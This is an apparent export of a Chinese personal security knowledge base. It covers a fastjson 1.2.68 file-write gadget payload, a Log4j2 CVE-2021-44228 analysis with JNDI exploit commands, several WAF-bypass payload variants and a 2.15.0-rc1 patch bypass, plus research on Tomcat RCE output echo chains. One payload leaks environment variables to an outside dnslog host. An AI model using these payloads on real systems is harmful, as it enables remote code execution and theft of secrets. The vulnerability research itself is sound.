\"charsetName\":\"UTF-8\", \"bufferSize\":1024 }, \"branch\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.output.WriterOutputStream\", \"writer\":{ \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\":\"/tmp/pwned\", \"charsetName\":\"UTF-8\", \"append\": false }, \"charsetName\":\"UTF-8\", \"bufferSize\": 1024, \"writeImmediately\": true }, \"trigger\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger2\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger3\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" } } 效果 总结 总结一下，首先要可以调用带有期望类参数的checkAutoType函数，然后payload第一个类是期望类，第二个类要继承第一个类，这样就可以直接被添加到内部mapping中，然后传入恶意的参数构造利用即可 但是因为checkAutoType代码限制，JNDI注入的类基本都被拦截了，绕不过还 参考链接 fastjson 1.2.68 最新版本有限制 autotype bypass fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路 Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析 How I use a JSON Deserialization 0day to Steal Your Money On The Blockchain 关于blackhat2021披露的fastjson1.2.68链 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/03.应用漏洞分析/06.log4j2_rce分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/03.应用漏洞分析/06.log4j2_rce分析.html","title":"06.log4j2_rce分析","keywords":"","body":" 前言 复现 pom.xml 启动JNDI注入Server 漏洞代码 效果 分析 调用栈 Debug分析 总结 一个小坑 常规绕过 多个${}执行流程 分隔符 其他解析器功效 绕过思路 奇淫技巧 2.15.0-rc1补丁绕过 2.15.0-rc2修复 影响范围 修复建议 前言 2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。 2021年12月9日晚，各大公众号突然发布漏洞预警 2021年12月10日晚，各大公众号开始蹭热度 Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。 由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。 此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行。（CNVD-2021-95914、CVE-2021-44228） 影响版本：Apache Log4j 2.x 2.15.0-rc1 存在补丁绕过，但是很鸡肋 复现 老规矩，先复现，再分析 pom.xml Jdk8u111 log4j-api不是必须 org.apache.logging.log4j log4j-core 2.14.1 org.apache.logging.log4j log4j-api 2.14.1 启动JNDI注入Server java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 漏洞代码 import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class Test { private static final Logger logger = LogManager.getLogger(Test.class); public static void main(String[] args) { logger.error(\"${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}\"); } } 效果 分析 调用栈 在利用过程中，因为我们明确知道要执行系统命令调用java.lang.Runtime#exec(java.lang.String[])，所以在exec方法处下断点，分析一下调用栈 运行获取调用栈 exec:485, Runtime (java.lang) :-1, ExploitgJlWqLWBF3 newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) getObjectFactoryFromReference:163, NamingManager (javax.naming.spi) getObjectInstance:189, DirectoryManager (javax.naming.spi) c_lookup:1085, LdapCtx (com.sun.jndi.ldap) p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx) lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx) lookup:205, GenericURLContext (com.sun.jndi.toolkit.url) lookup:94, ldapURLContext (com.sun.jndi.url.ldap) lookup:417, InitialContext (javax.naming) lookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) format:38, PatternFormatter (org.apache.logging.log4j.core.pattern) toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout) toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi) error:740, AbstractLogger (org.apache.logging.log4j.spi) main:9, Test 最明显的漏洞触发点，就是在第16行lookup:172, JndiManager (org.apache.logging.log4j.core.net) 跟过去看下，典型的JNDI注入 Debug分析 既然已经知道调用栈了，那么就可以慢慢分析了 从logger.error为入口，跟进去后会前期有一系列的和我们分析无关的过程，主要就是各种常规包装和调用 toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi) error:740, AbstractLogger (org.apache.logging.log4j.spi) main:9, Test 然后一直到了org.apache.logging.log4j.core.layout.PatternLayout.PatternSerializer#toSerializable(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder)，这个的主要功能就是通过遍历formatters一段一段的拼接输出的内容 当到了格式化我们传入的内容的时候，同样的会进行format处理，跟进发现会调用converter.format()，converter属于MessagePatternConverter类 所以就到了org.apache.logging.log4j.core.pattern.MessagePatternConverter#format 分析代码，可以看到，如果写入的日志内容中包含${，就会将我们输入的内容从workingBuilder分割出来，赋值给value，然后调用config.getStrSubstitutor().replace()方法 跟进replace()，会调用substitute()方法 在org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder, int, int, java.util.List)方法中，会首先遍历字符，通过正则判断，获取${和}的位置，最后截取出${和}中间的内容，得到jndi:xxxx 然后再次递归调用substitute()，继续截取${}中的内容，主要是为了判断是否还有${}，后续还有分隔符的判断，就先不管了 一直跟到解析变量这，跟进这个函数 可以猜测resolver解析时支持的关键词有[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]，而我们这里利用的jndi:xxx后续就会用到JndiLookup这个解析器 跟进lookup，就是通过:分割前面的关键词jndi部分和后面的payload内容部分，再获取解析器，通过解析器去lookup 继续跟进org.apache.logging.log4j.core.lookup.JndiLookup#lookup，会初始化JNDI客户端，继续调用lookup 再跟进就是非常常规的JNDI注入点了，分析也到此结束 总结 总结一下整个分析过程，也很简单 先判断内容中是否有${}，然后截取${}中的内容，得到我们的恶意payload jndi:xxx 后使用:分割payload，通过前缀来判断使用何种解析器去lookup 支持的前缀包括date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j，可以研究下其他的，说不定有文章可做 一个小坑 网上有各种百度、icloud等大厂商被打的情况，但是最开始一直认为只有logger.error()才会触发，所以百思不得其解，难道用户搜索的所有内容都会被百度用logger.error()记录下来？很明显这是不可能的啊！！！ 后面研究了半天，忽略了第一句话 此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行。 只要输入会被记录，就存在这个问题；什么情况下会记录呢？主要代码还是在 一直跟到最后，intLevel >= level.intLevel()为false，intLevel为我们使用的INFO等级的值200，level.intLevel()则为当前日志记录等级ERROR的值400 这也是为什么log4j默认情况下只会记录error和fatal的日志，如下图，所以我们测试的时候只有logger.error和fatal的时候才会触发。 因此其他日志等级也不是不能触发，修改一下日志记录等级，让它能够记录下来我们输入的payload，就可以触发漏洞了 import org.apache.logging.log4j.Level; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import org.apache.logging.log4j.core.config.Configurator; public class Test { private static Logger logger = LogManager.getLogger(Test.class); public static void main(String[] args) { // 第一个参数 \"Test\" 为类名 Configurator.setLevel(\"Test\", Level.INFO); logger.info(\"${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}\"); } } 常规绕过 现在很多WAF都是检测是否存在jndi:等关键词来判断，这个很明显拦得了一时，拦不了一世啊！！！ 通过上面的分析，我们也看到了有很多其他的解析器可用，包括date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j，还有分隔符啥的，结合起来可以绕过大多数常见的WAF了。 多个${}执行流程 先来分析一下多个${}的执行流程，Payload举例如下： ${aaa:${bbb:ccc}dd}${ee:ff} 当识别到多个${}时，准备来说是识别到多个${时，主要分为两种情况： 当属于嵌套类型时，比如${${}}，参数nestedVarCount会执行+1操作，表示存在嵌套，防止找错闭合时用的}，会先处理内部的${}，再将处理结果返回后继续处理${} ；具体的原因，就是因为会递归调用substitute()，所以会先把内部的处理完 当属于并列类型时，比如${}${}，会依次处理${}；因为他一次只会提取一整个${} 分隔符 org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute()里处理完${}后，就会有一部分的分隔符处理，一个是valueEscapeDelimiterMatcher [:\\-]，另一个是valueDelimiterMatcher [:-] 先来看第一个valueEscapeDelimiterMatcher，payload ${aa:\\\\-bb} 从下图可以看出来，就是给 :\\- 中的 \\ 去掉了变成了:-，好像是没啥用 再来看看valueDelimiterMatcher，payload ${aa:-bb} 从下面可以看出来，被:-分割成了前后两部分，前面的部分赋值给varName，后面部分赋值给varDefaultValue； varName会被传入到resolveVariable()进行解析，如果没有协议什么的，就会返回null 如果resolveVariable()返回值为null，varDefaultValue在后续的过程中也会递归调用substitute 最后会返回varDefaultValue的值 其他解析器功效 上面分析我们也注意到了，有多个解析协议可用，包括date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j，我们来分析一下作用 可以下断点到org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable的resolver.lookup(event, variableName)这一行，然后动态执行看效果；比如 解析协议 说明 date: 日期时间（详情org.apache.logging.log4j.core.lookup.DateLookup#lookup） java: 一些JVM的信息（可用参数version、runtime、vm、os、hw、locale，详情org.apache.logging.log4j.core.lookup.JavaLookup#lookup） marker: 返回event.getMarker()，不知道具体干啥的 ctx:key 返回event.getContextData().getValue(key)，就是获取上下文的数据 lower:KEY 返回字符串小写值 upper:key 返回字符串大写值 jndi: JNDI注入利用点，不多说了 main:key 返回((MapMessage) event.getMessage()).get(key)，也是获取一些变量值 jvmrunargs: 没搞懂。。。 sys:key 返回一些系统属性：System.getProperty(key) env:key 返回System.getenv(key) log4j:key 返回一些log4j的配置信息，可用值configLocation、configParentLocation 绕过思路 我们已经知道了${}的执行流程，也知道了分隔符怎么处理的，又知道了其他协议的解析返回值，那么就可以构造payload来绕过了，举一些例子 原始payload ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} 一些绕过paylioad ${${a:-j}ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${a:-j}n${::-d}i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:jn}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:${upper:jn}}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} 奇淫技巧 刚才分析了其他解析器功效，通过sys和env协议，结合jndi可以读取到一些环境变量和系统变量，特定情况下可能可以读取到系统密码 举个例子 ${jndi:ldap://${env:LOGNAME}.eynz6t.dnslog.cn} 2.15.0-rc1补丁绕过 LOG4J2-3201 Commit 和之前一样，直接来到org.apache.logging.log4j.core.layout.PatternLayout.PatternFormatterPatternSerializer#toSerializable；熟悉的遍历formatter拼接输出内容 到了拼接我们自定义内容的部分的时候，跟进会调用converter.format，可以看到这里的converter类已经变成了MessagePatternConverter.SimpleMessagePatternConverter，SimpleMessagePatternConverter是MessagePatternConverter的一个内部类 跟进，发现会调用((StringBuilderFormattable) msg).formatTo(toAppendTo) 再跟进formatTo，可以看出就是直接拼接字符串，并不会对包含有特殊内容${}的字符串进行处理 看着是没问题了，但是发现在MessagePatternConverter中还有一个内部类LookupMessagePatternConverter，这个类会对${的内容进行特殊处理。 但是怎么样才能让converter的类变成LookupMessagePatternConverter，而不是SimpleMessagePatternConverter呢？ 在newInstance这个初始化配置函数的地方下个断点，发现必须要满足2个条件，才能使用LookupMessagePatternConverter这个converter类 所以这也是补丁绕过比较鸡肋的地方，需要自己手动修改配置，正常人会故意这么写吗？ 为了分析绕过，我们只能手动配置了。。。 分析上面需要满足的2个条件： lookups为true，lookups的值是通过loadLookups(options)这个函数来获得的，分析一下这个函数，只要options这个字符串数组包含lookups即可 需要一个config的实例，属于org.apache.logging.log4j.core.config.DefaultConfiguration这个类，默认不为null 尝试了各种方法修改配置都不行 log4j2.formatMsgNoLookups=false log4j2.formatMsgLookups=true 所以采用了一个暴力的方法，就是在调试的时候动态修改options变量的值 options = new String[]{\"lookups\"} 可以看到，我们修改过后，再次来到converter.format(event, buf)，此时converter属于MessagePatternConverter.LookupMessagePatternConverter类了，目标达成 跟进也是我们想要的结果，对${进行定位判断 跟进replaceIn，就又到了常规的substitute了，接下来几步就不再次分析了 上面这么多都是解决配置问题，让它使用到我们想要的converter类 后面都是和之前类似差不多的，一直到了org.apache.logging.log4j.core.net.JndiManager#lookup，可以看出来加了很大一串try...catch...对我们的payload进行判断，一有不对劲的地方就return null 还是分析一下各个限制 变量 值 allowedProtocols [java, ldap, ldaps] allowedHosts [localhost, 127.0.0.1, d4m1tsdeMacBook-Pro.local, fe80:0:0:0:511a:1574:bca8:fa1b%utun3, fe80:0:0:0:5f4b:9388:9617:a34f%utun2, fe80:0:0:0:da80:893a:2c2b:22c9%utun1, fe80:0:0:0:4936:2ec2:ac06:59d0%utun0, fe80:0:0:0:b853:76ff:fec8:ca3a%llw0, fe80:0:0:0:b853:76ff:fec8:ca3a%awdl0, fe80:0:0:0:aede:48ff:fe00:1122%en5, fe80:0:0:0:1421:ea1:4520:c8ab%en0, 192.168.0.106, fe80:0:0:0:0:0:0:1%lo0, 0:0:0:0:0:0:0:1] allowedClasses [java.lang.Boolean, java.lang.Byte, java.lang.Character, java.lang.Double, java.lang.Float, java.lang.Integer, java.lang.Long, java.lang.Short, java.lang.String] 看似无懈可击，但是却有一个很严重的问题 如果出现URISyntaxException异常，就会直接执行catch，然后就到了this.context.lookup(name)，还是存在JNDI注入 所以我们现在的绕过想法，就是想办法让211行的URI uri = new URI(name);抛出URISyntaxException 分析一下这个报错，就可以发现触发的方式还是挺多的 也可以网上找找，比如： 试一下 所以绕过方法： java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8000/ #Exploit\" 8088 python3 -m http.server 8000 # 127.0.0.1 - - [12/Dec/2021 14:04:04] \"GET /Exploit.class HTTP/1.1\" 200 - ${jndi:ldap://127.0.0.1:8088/ Exploit} 结果，绕过成功 2.15.0-rc2修复 Handle URI exception Commit 从github上提交的代码，可以看出给catch没有return null的问题修复了 暂时还没有好的绕过思路，所以先这样吧 影响范围 srping-boot-strater-log4j2 Apache Solr Apache Flink Apache Druid Apache Struts2 ElasticSearch Flume Dubbo JedisLogstash Kafka ... 修复建议 升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0-rc2 版本 升级JDK版本，建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本，从根源上杜绝大部分常规的JNDI注入 临时措施 在jvm参数中添加 -Dlog4j2.formatMsgNoLookups=true 【针对 2.10.0 及以上的版本】 系统环境变量中将FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS设置为true 【针对 2.10.0 及以上的版本】 创建“log4j2.component.properties”文件，文件中增加配置“log4j2.formatMsgNoLookups=true” 【针对 2.10.0 及以上的版本】 限制受影响应用对外访问互联网 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/04.RCE回显链/01.Tomcat回显链（一）.html":{"url":"个人知识库/02.代码审计/01.Java安全/04.RCE回显链/01.Tomcat回显链（一）.html","title":"01.Tomcat回显链（一）","keywords":"","body":" 介绍 优势 实现手法 快速搭建tomcat调试环境 创建maven项目 修改pom.xml 创建Java代码文件夹 创建启动类 创建servlet servlet过程分析 利用链挖掘 response获取 Http11Processor类相关 获取global global链路代码 跟踪Registry.registerComponent() MBeanServer链路代码 总结 参考 介绍 2020年3月长亭Litch1师傅找到的一种基于全局储存的新思路，寻找在Tomcat处理Filter和Servlet之前有没有存储response变量的对象。整个过程分析下来就像是在构造调用链，一环扣一环，直到找到了那个静态变量或者是那个已经创建过的对象。 优势 利用中间件来实现回显，可以跨平台通用，只要使用了相关的组件就可以达到回显的目的 实现手法 个人感觉和内存马输出的方法类似，要想控制输出，那么就要获取到response，然后对其进行定制化调用，实现内容输出 快速搭建tomcat调试环境 之前在学习EL表达式的时候，使用了IDEA一种结合本地tomcat服务器搭建环境的方法； 这次我们使用另一种内置Tomcat的方法，来方便我们调试tomcat Tomcat实际上也是一个Java程序，我们看看Tomcat的启动流程： 启动JVM并执行Tomcat的main()方法； 加载war并初始化Servlet； 正常服务。 启动Tomcat无非就是设置好classpath并执行Tomcat某个jar包的main()方法，我们完全可以把Tomcat的jar包全部引入进来，然后自己编写一个main()方法，先启动Tomcat，然后让它加载我们的webapp就行。 创建maven项目 修改pom.xml 引入tomcat依赖包，修改pom.xml文件，引入依赖 tomcat-embed-core 和 tomcat-embed-jasper，引入的 Tomcat 版本 为 8.5.47。 tomcat-embed-core 依赖包含 javax.servlet 下的内容，因此不需要再额外引入依赖 javax.servlet-api。 UTF-8 1.7 1.7 8.5.47 org.apache.tomcat.embed tomcat-embed-core ${tomcat.version} provided org.apache.tomcat.embed tomcat-embed-jasper ${tomcat.version} provided org.apache.tomcat tomcat-jasper ${tomcat.version} org.apache.tomcat tomcat-catalina ${tomcat.version} 创建Java代码文件夹 创建maven规范的代码存放文件夹java 创建启动类 以TomcatMain为例，创建后启动访问http://localhost:8080/就可以看到hello world界面了 import org.apache.catalina.Context; import org.apache.catalina.LifecycleException; import org.apache.catalina.WebResourceRoot; import org.apache.catalina.startup.Tomcat; import org.apache.catalina.webresources.DirResourceSet; import org.apache.catalina.webresources.StandardRoot; import java.io.File; /** * @author d4m1ts */ public class TomcatMain { public static void main(String[] args) throws LifecycleException { // 启动tomcat Tomcat tomcat = new Tomcat(); tomcat.setPort(8080); tomcat.getConnector(); // 创建webapp // 创建上下文，后面要绝对路径 Context context = tomcat.addWebapp(\"\",\"/Users/d4m1ts/d4m1ts/java/TomcatEcho/src/main/webapp\"); WebResourceRoot resources = new StandardRoot(context); resources.addPreResources(new DirResourceSet(resources, \"/WEB-INF/classes\",new File(\"target/classes\").getAbsolutePath(), \"/\")); context.setResources(resources); tomcat.start(); tomcat.getServer().await(); } } 创建servlet 直接在java目录上点击鼠标右键New可能没有Create New Servlet等选项来快速创建servlet-api，需要执行下列的一些操作来添加上（有的可以直接看下面创建部分）： 1、将src标记成Sources文件 2、配置source root [!note] 我的servlet写在src\\main\\java里，所以就勾选第一个。要是打算在多个文件下Create New Servlet ，那就把src的都勾上。 快速创建servlet： 编写代码： import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @WebServlet(name = \"HelloServlet\", urlPatterns = \"/hello\") public class HelloServlet extends HttpServlet { @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType(\"text/html\"); PrintWriter writer = response.getWriter(); writer.write(\"hello world\"); writer.flush(); } } servlet过程分析 在我们编写的servlet处下个断点，然后用浏览器访问，观察调用栈 doGet:18, HelloServlet service:634, HttpServlet (javax.servlet.http) service:741, HttpServlet (javax.servlet.http) internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) invoke:199, StandardWrapperValve (org.apache.catalina.core) invoke:96, StandardContextValve (org.apache.catalina.core) invoke:528, AuthenticatorBase (org.apache.catalina.authenticator) invoke:139, StandardHostValve (org.apache.catalina.core) invoke:81, ErrorReportValve (org.apache.catalina.valves) invoke:87, StandardEngineValve (org.apache.catalina.core) service:343, CoyoteAdapter (org.apache.catalina.connector) service:798, Http11Processor (org.apache.coyote.http11) process:66, AbstractProcessorLight (org.apache.coyote) process:810, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1500, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:748, Thread (java.lang) 可以看到： 1-3行是servlet处理过程 4-5行是filter处理过程 再向下就是tomcat的各种初始化过程 [!note] 考虑到一些组件如Shiro、JFinal都有全局拦截器，如果我们想要非常通用，最好是在tomcat初始化的过程中就获取到response然后定制修改； 从上面的堆栈来看，就是从>=第六行去寻找，越靠后就说明在初始化过程中越早，利用效果越好。 利用链挖掘 response获取 [!tip] 找到response对象 分析它如何初始化的（它是怎么来的） 获取到它初始化后的实例 通过它去控制输出 平时我们要拿到一个内存中的实例对象，主要有两种方法： 反射 回溯分析，应用是怎么初始化这个变量的，找关联函数、类、类变量等，再得到这个变量 分析上面的调用栈，除去后期对servlet和filter的处理 invoke:199, StandardWrapperValve (org.apache.catalina.core) invoke:96, StandardContextValve (org.apache.catalina.core) invoke:528, AuthenticatorBase (org.apache.catalina.authenticator) invoke:139, StandardHostValve (org.apache.catalina.core) invoke:81, ErrorReportValve (org.apache.catalina.valves) invoke:87, StandardEngineValve (org.apache.catalina.core) service:343, CoyoteAdapter (org.apache.catalina.connector) service:798, Http11Processor (org.apache.coyote.http11) process:66, AbstractProcessorLight (org.apache.coyote) process:810, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1500, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:748, Thread (java.lang) 从下向上挨着看，发现整个调用过程中最初使用到response的就是第8行的service:798, Http11Processor (org.apache.coyote.http11) 说明response和resquest在这之前就已经初始化了，所以我们需要向上回溯分析 查看这个response的定义，是org.apache.coyote.AbstractProcessor抽象类中的一个变量Response response 跟一下这个response是如何初始化的 发现是AbstractProcessor类的构造函数初始化，且resquest对象中包含了response 也就是说：我们后期如果拿到了resquest，也可以通过其拿到response 注意：想要调用下面的protected构造函数，实际是需要调用上面的publuc构造函数，再通过上面的构造函数调用下面有response的构造函数 而在Http11Processor类中要用到这个protected修饰的response变量，大概率是继承了AbstractProcessor，去看下，很明显 所以我们还要找一下，response在Http11Processor类中是如何初始化的，看一下它的构造函数，是调用了父类AbstractProcessor的构造函数 所以request和response初始化是在Http11Processor的构造函数中初始化的 所以现在思路比较明确，Http11Processor类初始化后，通过各种方法拿到request或者response实例即可，因为它们是通过protected来修饰的，所以可以通过当前类、同包和子类中来查找是否有相关的函数来获取这俩实例 还是查找request和response实例的usage 发现org.apache.coyote.AbstractProcessor提供了一个getRequest方法来获取request对象 获取到request对象后，再通过Request类提供的getResponse方法来获取response 最后通过response的doWrite()方法，写进内容，返回给前端 也可以通过setHeader()方法写入到返回头中 所以一条response部分利用链如下： Http11Processor继承了AbstractProcessor，所以调用Http11Processor#getRequest()就等于AbstractProcessor#getRequest() Http11Processor#getRequest() -> AbstractProcessor#getRequest() -> Request#getResponse() -> Response#doWrite() Http11Processor类相关 前面挖掘部分说了，获取了Http11Processor实例后，就可以获取request，也就可以获取response，我们的目的也达成了，但是如何来获取Http11Processor实例或者Http11Processor request、response的变量呢 继续向前分析，看什么时候出现了Http11Processor类的实例；发现是在org.apache.coyote.AbstractProtocol.ConnectionHandler#process这个函数中，初始化是通过connections.get(socket)来赋值 但722行这个时候获取的processor值为null，因为connections值为空，在806行的时候才添加内容到connections中 所以我们重新下个断点分析一下processor是如何赋值的，可以看到connections722行初始化的时候长度是0，processor这个时候也是null，这也验证了我们上面说的 一直往后跟，在798行的时候会对processor进行赋值，调用this.getProtocol().createProcessor();来获得的 赋值后会进入register函数对processor进行一些处理，重点也在这 跟进注册函数，发现变量rp是RequestInfo类，而通过RequestInfo类我们可以获取到request，后续也就可以获取到response了 rp.req.getResponse() 所以这里我们可以着重关注一下，如何获取RequestInfo对象rp，从后面的内容可以看出来，主要有2个地方： 第一处会通过rp.setGlobalProcessor(global)设置到global中，具体可以看代码 第二处会通过Registry.getRegistry(null, null).registerComponent(rp,rpName, null);注册到其他地方 所以想要构造链，主要有两种方法： 寻找获取global的方法 跟踪Registry.registerComponent()流程，查看具体的RequestInfo对象被注册到什么地方了 获取global 先放下整条链的结果： Thread.currentThread().getContextClassLoader()->resources->context->context->StandardService->connectors->connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->processors->RequestInfo->req->response global变量是AbstractProtocol静态内部类ConnectionHandler的成员变量；不是static静态变量，因此我们还需要找存储AbstractProtocol类或AbstractProtocol子类。现在的利用链为 AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response 